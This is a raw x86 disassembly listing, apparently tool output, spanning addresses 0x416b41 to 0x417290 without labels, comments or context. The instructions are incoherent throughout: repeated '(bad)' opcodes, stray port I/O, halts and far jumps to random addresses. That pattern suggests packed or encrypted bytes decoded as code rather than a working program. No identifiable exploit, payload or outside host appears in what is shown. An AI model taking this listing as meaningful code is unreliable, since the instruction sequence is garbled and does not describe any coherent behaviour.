  416b41:	sub    eax,0x19e4ba83
  416b46:	inc    DWORD PTR ss:[eax]
  416b49:	out    dx,al
  416b4a:	mov    eax,ds:0x5f6ceae7
  416b4f:	es add al,0x31
  416b52:	or     DWORD PTR [esp+esi*1],eax
  416b55:	and    edx,ecx
  416b57:	out    0xd0,al
  416b59:	pop    ebp
  416b5a:	out    0xd2,eax
  416b5c:	hlt    
  416b5d:	addr16 sti 
  416b5f:	retf   
  416b60:	fild   QWORD PTR [ebx-0x1e]
  416b63:	leave  
  416b64:	icebp  
  416b65:	inc    ebp
  416b66:	cld    
  416b67:	(bad)
  416b6a:	int    0x9f
  416b6c:	in     eax,dx
  416b6d:	and    ah,dh
  416b6f:	cwde   
  416b70:	in     eax,dx
  416b71:	adc    esi,ebp
  416b73:	mov    dh,0x1e
  416b76:	stc    
  416b77:	sub    ah,0x0
  416b7a:	out    0x98,al
  416b7c:	fucomip st,st(7)
  416b7e:	fidivr WORD PTR [edx-0x1a]
  416b81:	or     bl,ch
  416b83:	pop    ebp
  416b85:	add    eax,0xaf083fb
  416b8a:	fdiv   QWORD PTR [edx-0x14]
  416b8d:	loopne 0x416b78
  416b8f:	dec    ebp
  416b90:	out    0x20,eax
  416b92:	or     edi,esp
  416b94:	add    esi,DWORD PTR [ecx]
  416b96:	or     DWORD PTR [eax+0x4],ecx
  416b99:	ror    DWORD PTR [eax],cl
  416b9b:	inc    esp
  416b9c:	add    al,0x3
  416b9e:	or     edi,edi
  416ba0:	add    eax,DWORD PTR [edi]
  416ba2:	or     DWORD PTR [eax],eax
  416ba4:	add    al,0xcf
  416ba6:	or     BYTE PTR [eax],al
  416ba8:	add    al,0x35
  416baa:	add    BYTE PTR ss:[ebx+0x0],cl
  416bae:	sub    eax,0x32de0035
  416bb3:	and    al,BYTE PTR [eax]
  416bb5:	aad    0x32
  416bb7:	call   0x367678bb
  416bbc:	add    BYTE PTR [edx+esi*1+0x32b9ffce],bh
  416bc3:	cmp    al,BYTE PTR [eax]
  416bc5:	shl    DWORD PTR [edx],0x22
  416bc8:	add    BYTE PTR [edx],cl
  416bca:	xor    eax,0x32bb003b
  416bcf:	add    BYTE PTR ss:[ecx],bl
  416bd2:	xor    eax,0x32c50035
  416bd7:	jmp    0x416bd8
  416bd9:	(bad)  
  416bda:	xor    dh,BYTE PTR [eax+eax*1]
  416bdd:	(bad)  
  416bde:	xor    dh,BYTE PTR [eax+eax*1]
  416be1:	jmp    0xcaa82e18
  416be6:	rcr    ch,0x70
  416be9:	(bad)  
  416bea:	xchg   esp,eax
  416beb:	cli    
  416bec:	pop    esp
  416bed:	xchg   esi,eax
  416bee:	fadd   QWORD PTR [esi-0x69]
  416bf2:	xchg   edi,eax
  416bf3:	cli    
  416bf4:	pop    esp
  416bf5:	shl    DWORD PTR [edx],cl
  416bf7:	out    0x73,eax
  416bf9:	cdq    
  416bfa:	dec    eax
  416bfb:	sbb    al,0x2d
  416bfd:	jmp    0x7da74963
  416c02:	test   edi,ecx
  416c04:	jno    0x416b8a
  416c06:	push   esi
  416c07:	das    
  416c08:	xchg   BYTE PTR fs:[eax-0x15],dl
  416c0c:	pop    ebx
  416c0d:	stos   BYTE PTR es:[edi],al
  416c0e:	push   ebp
  416c0f:	jecxz  0x416c7b
  416c11:	push   esi
  416c12:	add    BYTE PTR [ebx+0x6e],cl
  416c15:	push   edx
  416c16:	push   eax
  416c17:	popa   
  416c18:	jmp    0x416c6a
  416c1a:	dec    esp
  416c1b:	inc    edi
  416c1c:	hlt    
  416c1d:	bound  ebx,QWORD PTR [ebx+0x3e]
  416c20:	outs   dx,BYTE PTR ds:[esi]
  416c21:	push   edx
  416c22:	add    cl,ah
  416c24:	js     0x416c88
  416c26:	push   ebx
  416c27:	in     eax,dx
  416c28:	jbe    0x416c9d
  416c2a:	gs push 0x25
  416c2d:	and    DWORD PTR [esp+esi*1+0x3d],esp
  416c31:	ins    BYTE PTR es:[edi],dx
  416c32:	jae    0x416c70
  416c34:	add    eax,0x683c694f
  416c39:	push   eax
  416c3a:	sub    bh,BYTE PTR gs:[ebx+0x62]
  416c3e:	jb     0x416c38
  416c40:	sub    BYTE PTR [esp+ebx*2+0x1f],ah
  416c44:	push   0x65fa555f
  416c49:	std    
  416c4a:	push   edx
  416c4b:	xor    DWORD PTR [ecx+0x62],edi
  416c4e:	push   ebx
  416c4f:	sub    eax,0xfa657377
  416c54:	sub    DWORD PTR [ecx],esp
  416c56:	fs xchg esp,eax
  416c58:	push   ebx
  416c59:	bound  ebp,QWORD PTR [ebp-0x9]
  416c5c:	pop    ebp
  416c5d:	bound  esp,QWORD PTR [eax]
  416c5f:	mov    WORD PTR [edi+ebp*2+0x65],ds
  416c63:	jmp    0x416cc2
  416c65:	ins    BYTE PTR es:[edi],dx
  416c66:	jb     0x416c59
  416c68:	or     DWORD PTR [edi+0x69],ecx
  416c6b:	in     al,dx
  416c6c:	push   0x77ea6550
  416c71:	bound  esi,QWORD PTR [edx+0x68]
  416c74:	sub    BYTE PTR [ebp+ebp*1+0x0],ah
  416c78:	fnsave [esi+0x62]
  416c7b:	jb     0x416c15
  416c7d:	push   esi
  416c7e:	data16 je 0x416c2e
  416c81:	push   esi
  416c82:	bound  esi,QWORD PTR [edx-0x2]
  416c85:	push   0x4d6d206f
  416c8a:	sub    dl,BYTE PTR [ebp-0x15]
  416c8d:	push   0x5ac8206f
  416c92:	std    
  416c93:	and    al,0xfb
  416c95:	push   eax
  416c96:	dec    eax
  416c97:	shl    DWORD PTR gs:[ebp+0x65],1
  416c9b:	popa   
  416c9c:	xor    ecx,ecx
  416c9e:	jmp    0xf00a50a2
  416ca3:	(bad)
  416ca8:	int3   
  416ca9:	xor    DWORD PTR [ebx+eiz*1],esp
  416cac:	xchg   ebp,eax
  416cad:	push   ss
  416cae:	aad    0x45
  416cb0:	jge    0x416cc4
  416cb2:	add    al,0x44
  416cb4:	xchg   esp,eax
  416cb5:	push   ss
  416cb6:	out    dx,eax
  416cb7:	ja     0x416c45
  416cb9:	and    al,0xd0
  416cbb:	dec    edi
  416cbc:	xor    DWORD PTR [edi],ecx
  416cbe:	jmp    0x416d33
  416cc0:	mov    WORD PTR [edi],cs
  416cc2:	sub    bh,BYTE PTR [eax-0x74]
  416cc5:	push   ss
  416cc6:	add    al,0x55
  416cc8:	mov    WORD PTR [eax],es
  416cca:	and    al,0x44
  416ccc:	push   eax
  416ccd:	outs   dx,BYTE PTR ds:[esi]
  416cce:	in     al,0xff
  416cd0:	jp     0x416d3d
  416cd2:	loop   0x416d3a
  416cd4:	dec    edi
  416cd5:	add    al,al
  416cd7:	pop    esi
  416cd8:	pop    ebp
  416cd9:	inc    ecx
  416cda:	add    DWORD PTR [ecx+0x0],edx
  416cdd:	pusha  
  416cde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416cdf:	in     al,dx
  416ce0:	jae    0x416d2e
  416ce2:	add    ah,dl
  416ce4:	ins    BYTE PTR es:[edi],dx
  416ce5:	inc    ebx
  416ce6:	push   ebp
  416ce7:	in     al,0x73
  416ce9:	adc    DWORD PTR [edi+0x1],ebp
  416cec:	je     0x416cfe
  416cee:	inc    eax
  416cef:	in     eax,0x62
  416cf1:	xor    DWORD PTR [edx],ecx
  416cf3:	add    al,0x27
  416cf5:	xor    DWORD PTR [edx+0x1],eax
  416cf8:	inc    ecx
  416cf9:	out    0x9b,al
  416cfb:	(bad)  
  416cfc:	push   ebx
  416cfd:	jecxz  0x416c9f
  416cff:	int3   
  416d00:	dec    ebp
  416d01:	frstor [ecx-0x2f]
  416d04:	push   ecx
  416d05:	call   0xd89331be
  416d0a:	popa   
  416d0b:	ror    BYTE PTR [ebp-0x8],1
  416d0e:	nop
  416d0f:	rol    BYTE PTR [edx+0x31],1
  416d12:	lahf   
  416d13:	leave  
  416d14:	inc    edx
  416d15:	repnz or BYTE PTR [edx],dh
  416d18:	add    al,0xef
  416d1a:	mov    ebx,0xc3f7bf38
  416d1f:	and    al,0x4
  416d21:	xor    ebp,ebx
  416d23:	cmp    eax,0x39dad7e1
  416d28:	add    al,0xc4
  416d2a:	test   BYTE PTR [edi-0x1f],0x97
  416d2e:	fist   DWORD PTR ds:0xe6dda0ef
  416d34:	repz jg 0x416d2f
  416d37:	sbb    ecx,esi
  416d39:	test   edi,esi
  416d3b:	add    bl,cl
  416d3d:	test   dl,ch
  416d3f:	add    ch,bh
  416d41:	add    BYTE PTR [ebx-0x6c0aebf7],dl
  416d47:	not    DWORD PTR [ebx+eiz*8]
  416d4a:	mov    esp,esi
  416d4c:	sbb    eax,0xfbdd8ff2
  416d51:	fsubrp st(6),st
  416d53:	in     eax,0xf2
  416d55:	repz sbb BYTE PTR [esi+edx*1],bl
  416d59:	add    al,0x49
  416d5b:	cmc    
  416d5c:	shl    bl,cl
  416d5e:	or     BYTE PTR [esi+eax*1],bl
  416d61:	add    al,0x59
  416d63:	cmc    
  416d64:	shl    bl,cl
  416d66:	inc    ecx
  416d67:	das    
  416d68:	push   ss
  416d69:	sub    DWORD PTR [ecx],esi
  416d6b:	int    0xa5
  416d6d:	call   0xdf04518f
  416d72:	or     cl,al
  416d74:	mov    esi,0x8bde0df5
  416d79:	add    esi,ebp
  416d7b:	(bad)  
  416d7c:	mov    ?,ebp
  416d7e:	sbb    eax,0x1bee7fde
  416d83:	or     DWORD PTR [ebx-0x6a08e93c],ebp
  416d89:	out    0x13,al
  416d8b:	(bad)  [edx+0x8e1ee]
  416d91:	call   0xf953:0x7673e559
  416d98:	bound  eax,QWORD PTR [ebp+0x6c]
  416d9b:	jecxz  0x416e0e
  416d9d:	dec    esi
  416d9e:	push   esi
  416d9f:	out    0x4f,al
  416da1:	inc    ebp
  416da2:	push   esi
  416da3:	clc    
  416da4:	call   FWORD PTR [edi]
  416da6:	add    BYTE PTR [ebx-0x8],cl
  416da9:	jae    0x416df3
  416dab:	dec    ecx
  416dac:	fistp  WORD PTR [ebp+eiz*1+0x1a]
  416db0:	stc    
  416db1:	call   DWORD PTR [edi+ebp*8]
  416db4:	clc    
  416db5:	ins    BYTE PTR es:[edi],dx
  416db6:	cmp    al,0xa
  416db8:	clc    
  416db9:	push   0xffffffe9
  416dbb:	(bad)  
  416dbc:	mov    esp,0xf91d0a66
  416dc1:	ins    BYTE PTR es:[edi],dx
  416dc2:	add    al,0xe6
  416dc4:	push   0x59
  416dc6:	sub    cl,BYTE PTR [eax]
  416dc8:	loopne 0x416e36
  416dca:	or     eax,0x1b596b08
  416dcf:	fsubr  st,st(1)
  416dd1:	push   0x73df0624
  416dd6:	jmp    0xcc8c8dc8
  416ddb:	into   
  416ddc:	out    0x6c,eax
  416dde:	iret   
  416ddf:	xor    cl,ch
  416de1:	dec    eax
  416de2:	add    al,0xee
  416de4:	out    0x6b,eax
  416de6:	(bad)  
  416de7:	leave  
  416de8:	fdiv   st(7),st
  416dea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416deb:	loop   0x416de5
  416ded:	ins    BYTE PTR es:[edi],dx
  416dee:	(bad)  
  416def:	fisub  WORD PTR [edx-0x46]
  416df3:	xor    al,dh
  416df5:	outs   dx,DWORD PTR ds:[esi]
  416df6:	rcl    BYTE PTR [ebp-0x5d53a696],0xe3
  416dfd:	pusha  
  416dfe:	mov    ebp,0x8a66dacf
  416e03:	xor    bl,al
  416e05:	jae    0x416d8f
  416e07:	nop
  416e08:	in     al,0x2a
  416e0a:	add    BYTE PTR [eax],al
  416e0c:	(bad)  
  416e0d:	cmp    cl,BYTE PTR [ebp+0x0]
  416e10:	jmp    0x416e70
  416e12:	jno    0x416e79
  416e14:	jmp    0x416e35
  416e16:	outs   dx,BYTE PTR gs:[esi]
  416e18:	mov    cl,0x6
  416e1a:	pop    esp
  416e1b:	push   ebx
  416e1c:	add    DWORD PTR [ecx+0x62],edi
  416e1f:	jae    0x416e79
  416e21:	push   edx
  416e22:	push   ebx
  416e23:	imul   ebp,ebx,0xfd6f605b
  416e29:	and    al,0x49
  416e2b:	gs in  al,0x5b
  416e2e:	pop    esi
  416e2f:	add    BYTE PTR [esi],bh
  416e31:	dec    ebx
  416e32:	jno    0x416ea4
  416e34:	sbb    BYTE PTR [edi-0x3],dl
  416e37:	or     BYTE PTR fs:[edx-0x3],bl
  416e3b:	jae    0x416e45
  416e3d:	pop    ebp
  416e3e:	std    
  416e3f:	ins    DWORD PTR es:[edi],dx
  416e40:	sbb    BYTE PTR [ebx-0x3],cl
  416e43:	jb     0x416e5d
  416e45:	push   es
  416e46:	add    BYTE PTR [edi+edx*2+0x61],bl
  416e4a:	ins    BYTE PTR es:[edi],dx
  416e4b:	bound  ebp,QWORD PTR [ecx]
  416e4d:	popa   
  416e4e:	sbb    eax,0x6b5a3f44
  416e53:	ins    BYTE PTR es:[edi],dx
  416e54:	das    
  416e55:	fs popa 
  416e57:	fiadd  DWORD PTR gs:0x643e4d4f
  416e5e:	outs   dx,DWORD PTR ds:[esi]
  416e5f:	arpl   ax,sp
  416e61:	add    eax,0x76f57246
  416e66:	gs inc esi
  416e68:	test   BYTE PTR [ebp-0x3],dl
  416e6b:	sub    eax,0x43409b
  416e70:	add    dl,bl
  416e72:	popa   
  416e73:	pop    esi
  416e74:	jp     0x416eeb
  416e76:	stos   DWORD PTR es:[edi],eax
  416e77:	jno    0x416ee9
  416e79:	mov    BYTE PTR [esi+0x66],dh
  416e7c:	je     0x416e23
  416e7e:	and    esp,DWORD PTR [ecx+eiz*2-0x5c]
  416e82:	add    eax,0x8f31614c
  416e87:	in     eax,dx
  416e88:	dec    edi
  416e89:	adc    BYTE PTR [edi-0x11f98b0e],cl
  416e8f:	fdiv   st(7),st
  416e91:	cli    
  416e92:	xor    dl,0x73
  416e95:	lock jnp 0x416e75
  416e98:	jno    0x416e6e
  416e9a:	out    dx,al
  416e9b:	icebp  
  416e9c:	(bad)  
  416e9d:	jmp    0xdece:0xe473f0c0
  416ea4:	jno    0x416ed7
  416ea6:	and    al,0xe3
  416ea8:	jo     0x416e6f
  416eaa:	das    
  416eab:	in     eax,0x71
  416ead:	mov    ebp,0x976cd25f
  416eb2:	push   ds
  416eb3:	in     eax,dx
  416eb4:	pop    esi
  416eb5:	mov    ds:0x8d45d7d5,eax
  416eba:	shl    eax,1
  416ebc:	adc    DWORD PTR [di],0x346d68e3
  416ec3:	call   0xbe56fa26
  416ec8:	jae    0x416e4b
  416eca:	shl    DWORD PTR ss:[edx+0x7d],1
  416ece:	data16 in al,dx
  416ed0:	ins    DWORD PTR es:[edi],dx
  416ed1:	push   esi
  416ed2:	arpl   WORD PTR [ecx],ax
  416ed4:	pop    esp
  416ed5:	add    BYTE PTR [ebx+0xe],dh
  416ed8:	jecxz  0x416f53
  416eda:	push   esp
  416edb:	xor    al,dh
  416edd:	outs   dx,DWORD PTR ds:[esi]
  416ede:	xor    DWORD PTR [eax],eax
  416ee0:	fisubr WORD PTR [edi+0x5d]
  416ee3:	jb     0x416ea0
  416ee5:	push   ebx
  416ee6:	popa   
  416ee7:	or     ebp,DWORD PTR [ecx]
  416ee9:	cs ins DWORD PTR es:[edi],dx
  416eeb:	dec    ecx
  416eec:	jecxz  0x416f56
  416eee:	push   ebp
  416eef:	mov    ds:0x561d62e9,eax
  416ef4:	aad    0x6c
  416ef6:	and    DWORD PTR [ebp-0x1d],edx
  416ef9:	pop    ebx
  416efa:	adc    ah,BYTE PTR [edi+0x9106ae8]
  416f00:	xchg   ebp,eax
  416f01:	fisttp WORD PTR [esi-0x1d427231]
  416f07:	mov    eax,0xf70dc2e6
  416f0c:	jl     0x416eee
  416f0e:	adc    ebp,ebx
  416f10:	(bad)  
  416f11:	out    0xdc,al
  416f13:	fcmovne st,st(4)
  416f15:	out    dx,eax
  416f16:	(bad)  
  416f18:	out    0x32,al
  416f1a:	cmc    
  416f1b:	xor    eax,0x8e6cfa5
  416f20:	pop    edx
  416f21:	jmp    0x416ee5
  416f23:	in     eax,dx
  416f24:	pop    ecx
  416f25:	es into 
  416f27:	idiv   BYTE PTR [edi]
  416f29:	add    al,0xdd
  416f2b:	sbb    esp,DWORD PTR [ebx]
  416f2d:	daa    
  416f2e:	out    dx,eax
  416f2f:	mov    esp,0xbc8d0416
  416f34:	dec    edi
  416f35:	lock xchg ebx,eax
  416f37:	int    0x4b
  416f39:	icebp  
  416f3a:	add    BYTE PTR [edi-0x5f20c310],dl
  416f40:	or     DWORD PTR [edx],edi
  416f42:	lds    esi,FWORD PTR [ebp+edi*4+0x35]
  416f46:	ret    
  416f47:	pusha  
  416f48:	into   
  416f49:	xor    al,cl
  416f4b:	mov    ch,dl
  416f4d:	sbb    ecx,esi
  416f4f:	xchg   ebx,eax
  416f50:	fsub   QWORD PTR [edx]
  416f52:	shl    BYTE PTR [edi-0x27],1
  416f55:	add    ecx,eax
  416f57:	dec    edi
  416f58:	jmp    0x416f6c
  416f5a:	stc    
  416f5b:	je     0x416f7f
  416f5d:	mov    bh,0x2f
  416f5f:	and    ah,cl
  416f61:	push   ds
  416f62:	cmp    al,0x1a
  416f64:	iret   
  416f65:	adc    al,0xbe
  416f67:	add    BYTE PTR [esi],dh
  416f69:	sbb    BYTE PTR [esi+ecx*1],dh
  416f6c:	retf   0xc2fb
  416f6f:	add    esp,ecx
  416f71:	jmp    DWORD PTR [esi]
  416f73:	popa   
  416f74:	and    edi,esi
  416f76:	xor    esp,DWORD PTR [ebx-0x35]
  416f79:	(bad)  
  416f7a:	cli    
  416f7b:	fcomp  QWORD PTR [ebx]
  416f7d:	aaa    
  416f7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416f7f:	jo     0x416f63
  416f81:	pop    ebx
  416f82:	fcom   DWORD PTR [ebx+ebx*1+0x5c]
  416f86:	fstp   DWORD PTR [esi-0x24]
  416f89:	xchg   WORD PTR [ecx+0x1b],ax
  416f8d:	add    BYTE PTR [ebx+edx*4+0x7eaf76d8],ah
  416f94:	xlat   BYTE PTR ds:[ebx]
  416f95:	call   FWORD PTR [esp+ebp*2+0x539a73ea]
  416f9c:	fstp   DWORD PTR [esi+0x7f]
  416f9f:	add    BYTE PTR [ebp+0x67],dh
  416fa2:	sub    esp,DWORD PTR [ecx+0x6f]
  416fa5:	idiv   edi
  416fa7:	push   cs
  416fa8:	inc    ebx
  416fa9:	jmp    0x41701a
  416fab:	jmp    0x1c933a1e
  416fb0:	pusha  
  416fb1:	mov    ecx,0x95b1655
  416fb6:	jo     0x417000
  416fb8:	and    dl,bl
  416fba:	je     0x417002
  416fbc:	and    ebp,ebx
  416fbe:	pop    ds
  416fbf:	hlt    
  416fc0:	arpl   WORD PTR [ebx],sp
  416fc2:	(bad)  
  416fc4:	xor    bl,dl
  416fc6:	jo     0x416fcc
  416fc8:	add    esi,ebp
  416fca:	pop    esi
  416fcb:	add    al,0xde
  416fcd:	and    BYTE PTR [ecx-0x2d],dh
  416fd0:	xor    ch,bh
  416fd2:	jb     0x416fe9
  416fd4:	fld    DWORD PTR [esi]
  416fd6:	pop    edi
  416fd7:	add    eax,0xfa62d8d1
  416fdc:	loope  0x416ffe
  416fde:	jno    0x416f93
  416fe0:	xor    dh,BYTE PTR [edi]
  416fe2:	add    BYTE PTR [ebp-0x45b54771],bh
  416fe8:	loopne 0x416fa6
  416fea:	sub    al,0xe9
  416fec:	jl     0x416fa8
  416fee:	dec    edi
  416fef:	or     edi,ebp
  416ff1:	cmc    
  416ff2:	je     0x416ff4
  416ff4:	cwde   
  416ff5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416ff6:	push   ecx
  416ff7:	push   eax
  416ff8:	(bad)  
  416ff9:	ins    DWORD PTR es:[edi],dx
  416ffa:	je     0x416ffc
  416ffc:	(bad)  [ebx+0x71]
  416fff:	fld    TBYTE PTR gs:[eax+edi*2]
  417003:	ins    DWORD PTR es:[edi],dx
  417004:	add    BYTE PTR [edx+ecx*1+0x56ce4f4f],ah
  41700b:	push   esp
  41700c:	inc    ecx
  41700d:	mov    edx,0xf75259a7
  417012:	ins    BYTE PTR es:[di],dx
  417014:	sub    eax,0x204d569e
  417019:	stos   DWORD PTR es:[edi],eax
  41701a:	sub    al,0x33
  41701c:	pop    esp
  41701d:	mov    ebx,0xd8696f69
  417022:	jne    0x417094
  417024:	add    BYTE PTR [ebx],cl
  417026:	dec    edx
  417027:	inc    ebx
  417028:	push   esp
  417029:	dec    DWORD PTR [ebx+0x4f]
  41702c:	inc    ebp
  41702d:	add    al,0x3f
  41702f:	ins    BYTE PTR es:[edi],dx
  417030:	(bad)  
  417031:	mul    DWORD PTR [edi]
  417033:	inc    esi
  417034:	push   esp
  417035:	dec    eax
  417036:	sub    eax,0x561f2e2f
  41703b:	inc    ebx
  41703c:	push   esp
  41703d:	cmp    BYTE PTR [esi],bh
  41703f:	bound  esi,QWORD PTR [edx+0x5e]
  417042:	jo     0x4170b3
  417044:	jae    0x41705e
  417046:	push   eax
  417047:	push   ecx
  417048:	push   eax
  417049:	clc    
  41704a:	dec    esi
  41704b:	ins    BYTE PTR es:[edi],dx
  41704c:	jne    0x417084
  41704e:	popa   
  41704f:	std    
  417050:	inc    ebp
  417051:	cmp    al,0x3d
  417053:	sbb    eax,0x62694146
  417058:	and    eax,0x61500d2c
  41705d:	fistp  DWORD PTR [esi+0x74]
  417060:	outs   dx,DWORD PTR ds:[esi]
  417061:	fisubr DWORD PTR [ebp-0x3]
  417064:	push   edx
  417065:	std    
  417066:	pop    ebx
  417067:	jae    0x4170ce
  417069:	add    dl,ch
  41706b:	inc    edi
  41706c:	pop    esi
  41706d:	ins    DWORD PTR es:[edi],dx
  41706e:	xor    DWORD PTR [ebp+0x1],edx
  417071:	push   ebx
  417072:	inc    edx
  417073:	dec    ebp
  417074:	repz inc esi
  417076:	cmc    
  417077:	outs   dx,DWORD PTR ds:[esi]
  417078:	mov    esp,0xdc9c186d
  41707d:	pop    esi
  41707e:	or     eax,0xc71dcb4
  417083:	push   ebx
  417084:	cmc    
  417085:	ins    BYTE PTR es:[edi],dx
  417086:	add    ebp,DWORD PTR [ecx-0x7de9afff]
  41708c:	cmc    
  41708d:	dec    ebp
  41708e:	add    al,0x8d
  417090:	jecxz  0x4170f4
  417092:	add    esi,DWORD PTR [eax-0x2a]
  417095:	(bad)
  41709a:	std    
  41709b:	mov    cl,dh
  41709d:	bound  esi,QWORD PTR [ecx]
  41709f:	inc    eax
  4170a0:	add    DWORD PTR [eax],eax
  4170a2:	xor    DWORD PTR [eax-0x45cec125],edi
  4170a8:	out    0x8e,al
  4170aa:	(bad)  
  4170ab:	lock leave 
  4170ad:	dec    ebx
  4170ae:	push   cs
  4170af:	xchg   BYTE PTR [ebp+eax*1-0x6f],cl
  4170b3:	aaa    
  4170b4:	push   0xcb1d97d1
  4170b9:	jmp    DWORD PTR [eax+0x14]
  4170bc:	aaa    
  4170bd:	arpl   WORD PTR cs:[ecx+0x1f],bx
  4170c1:	xor    DWORD PTR [esi+0x72],ebx
  4170c4:	xor    DWORD PTR [edx],ecx
  4170c6:	aaa    
  4170c7:	pop    edx
  4170c8:	push   ds
  4170c9:	push   es
  4170ca:	xor    BYTE PTR [ebp+0x8],ch
  4170cd:	add    eax,0x16f3200
  4170d2:	push   ecx
  4170d3:	xchg   BYTE PTR [eax+edi*8],cl
  4170d6:	je     0x417128
  4170d8:	pusha  
  4170d9:	call   0xe23ae639
  4170de:	pop    esi
  4170df:	bound  esi,QWORD PTR [eax+ebx*8]
  4170e2:	dec    edi
  4170e3:	jne    0x4170e4
  4170e5:	fidiv  DWORD PTR [ebx+0x54]
  4170e8:	or     DWORD PTR [edi],eax
  4170ea:	shl    DWORD PTR [edi-0xd],0xc7
  4170ee:	jmp    0xd845:0xbbe6d753
  4170f5:	rol    BYTE PTR [ebx],cl
  4170f7:	add    bl,al
  4170f9:	retf   
  4170fa:	cmc    
  4170fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4170fc:	aam    0xc7
  4170fe:	mul    BYTE PTR [ecx]
  417100:	or     DWORD PTR [edi-0x1922df1e],edx
  417106:	aad    0x13
  417108:	not    BYTE PTR [ebp-0x5cd6ec09]
  41710e:	fadd   QWORD PTR [eax]
  417110:	or     DWORD PTR [ebx-0x7c19003a],esi
  417116:	cmc    
  417117:	rcr    ch,cl
  417119:	mov    esi,ebx
  41711b:	ss cmp ax,0xffd1
  417120:	out    dx,eax
  417121:	out    0xf8,al
  417123:	loope  0x417112
  417125:	js     0x417148
  417127:	shl    bl,1
  417129:	push   esp
  41712a:	jmp    0xedc0:0x2fe6ebcf
  417131:	pop    edx
  417132:	clc    
  417133:	add    bh,cl
  417135:	repnz inc ebp
  417137:	and    al,0x9f
  417139:	jmp    0x25e7:0x276be753
  417140:	xor    ebx,ebx
  417142:	inc    edi
  417143:	loopne 0x4170e8
  417145:	out    dx,al
  417146:	jmp    0x41716d
  417148:	xor    DWORD PTR [eax-0x237d15eb],edi
  41714e:	pop    es
  41714f:	not    BYTE PTR [ebx-0x7424c63b]
  417155:	hlt    
  417156:	cld    
  417157:	xlat   BYTE PTR ds:[ebx]
  417158:	(bad)  
  417159:	fisttp QWORD PTR [esi]
  41715b:	jecxz  0x4171b8
  41715d:	lds    edx,FWORD PTR [esi]
  41715f:	test   DWORD PTR [edx+0x10fffbd],0xc5fa62b9
  417169:	jmp    0xce45:0x63bdd76c
  417170:	(bad)
  417173:	enter  0xe6d7,0xff
  417177:	mov    bl,0xa5
  417179:	out    0x71,al
  41717b:	mov    bh,0x93
  41717d:	out    dx,al
  41717e:	(bad)  
  41717f:	jmp    0xbab23406
  417184:	cdq    
  417185:	hlt    
  417186:	jno    0x41714d
  417188:	xor    bh,BYTE PTR [ecx-0x2a816494]
  41718e:	jb     0x41711c
  417190:	xchg   esp,eax
  417191:	out    0x71,al
  417193:	jmp    0x7cb357f6
  417198:	add    BYTE PTR [ebx+0x7e955ef5],cl
  41719e:	fisubr DWORD PTR [edi-0x7c]
  4171a1:	xor    dl,bl
  4171a3:	outs   dx,DWORD PTR ds:[esi]
  4171a4:	jns    0x41720e
  4171a6:	mov    bh,0x4f
  4171a8:	mov    edi,0xe96bee5a
  4171ad:	jbe    0x417184
  4171af:	ins    BYTE PTR es:[edi],dx
  4171b0:	push   ebp
  4171b1:	push   esi
  4171b2:	repz pop esi
  4171b4:	dec    ebp
  4171b5:	adc    al,0x32
  4171b7:	add    BYTE PTR [edx],bh
  4171b9:	adc    ch,ch
  4171bb:	jae    0x4171fb
  4171bd:	adc    bl,cl
  4171bf:	bound  ebx,QWORD PTR ds:0x4f65f5f4
  4171c5:	push   cs
  4171c6:	call   0x346a60b
  4171cb:	push   ecx
  4171cc:	push   ss
  4171cd:	sbb    edx,edi
  4171cf:	je     0x4171d9
  4171d1:	pop    es
  4171d2:	call   0xd31aa0d6
  4171d7:	pop    ds
  4171d8:	add    eax,0x73d9d6
  4171dd:	inc    ecx
  4171de:	addr16 pop esi
  4171e0:	je     0x417223
  4171e2:	push   0x6bdb206b
  4171e7:	outs   dx,DWORD PTR ds:[esi]
  4171e8:	jbe    0x41721f
  4171ea:	pop    ebx
  4171eb:	std    
  4171ec:	inc    ebp
  4171ed:	test   BYTE PTR [esi],dh
  4171ef:	sbb    eax,0x715df564
  4171f4:	imul   ebp,esi,0xef697167
  4171fa:	push   0xeb00751d
  4171ff:	imul   ebp,DWORD PTR [edi+0x0],0xffffffd6
  417203:	cmp    cl,BYTE PTR [ebp+0x20]
  417206:	imul   esi,DWORD PTR fs:[eax+0x74],0x71
  41720b:	push   0x69a1745e
  417210:	imul   esp,DWORD PTR [eax],0xffffff98
  417213:	addr16 jo 0x417289
  417216:	xchg   edi,eax
  417217:	imul   ebp,DWORD PTR [edi+0x64],0x50515058
  41721e:	js     0x41728a
  417220:	bound  esi,QWORD PTR [ebx-0x1c]
  417223:	imul   esp,DWORD PTR ds:[ecx-0x2c],0x3e
  417228:	ins    BYTE PTR es:[edi],dx
  417229:	outs   dx,BYTE PTR ds:[esi]
  41722a:	js     0x417282
  41722c:	ins    BYTE PTR es:[edi],dx
  41722d:	jb     0x417213
  41722f:	or     al,0x46
  417231:	push   esp
  417232:	clc    
  417233:	sub    al,0x64
  417235:	(bad)  gs:[eax+0x66]
  417239:	outs   dx,BYTE PTR ds:[esi]
  41723a:	jns    0x41729d
  41723c:	outs   dx,WORD PTR ds:[esi]
  41723e:	jle    0x41726d
  417240:	pop    edi
  417241:	popa   
  417242:	fs ins BYTE PTR es:[edi],dx
  417244:	imul   ebp,DWORD PTR [edi+0x67],0x2854460d
  41724b:	sub    eax,0x6b1f7270
  417250:	data16 ins BYTE PTR es:[edi],dx
  417252:	xor    eax,0x3145fd56
  417257:	and    al,0xd4
  417259:	push   eax
  41725a:	pop    ecx
  41725b:	or     eax,0x12316be0
  417260:	clc    
  417261:	outs   dx,DWORD PTR ds:[esi]
  417262:	add    BYTE PTR [edx-0x8],ah
  417265:	out    0x6b,al
  417267:	inc    ebp
  417268:	dec    edx
  417269:	jecxz  0x4172db
  41726b:	pop    eax
  41726c:	jo     0x417240
  41726e:	ins    BYTE PTR es:[edi],dx
  41726f:	dec    edi
  417270:	inc    esp
  417271:	neg    BYTE PTR [esi+0x43]
  417274:	dec    ebp
  417275:	int    0x4a
  417277:	jo     0x417218
  417279:	and    BYTE PTR [ecx+0x1e],dl
  41727c:	dec    edx
  41727d:	cmc    
  41727e:	pop    ebx
  41727f:	out    dx,eax
  417280:	adc    ecx,0x46
  417283:	cmovp  ebx,esi
  417286:	pop    ebx
  417287:	add    dl,BYTE PTR [ebp-0xb]
  41728a:	jb     0x41728d
  41728c:	jo     0x417253
  41728e:	pop    esi
  41728f:	std    
  417290:	nop
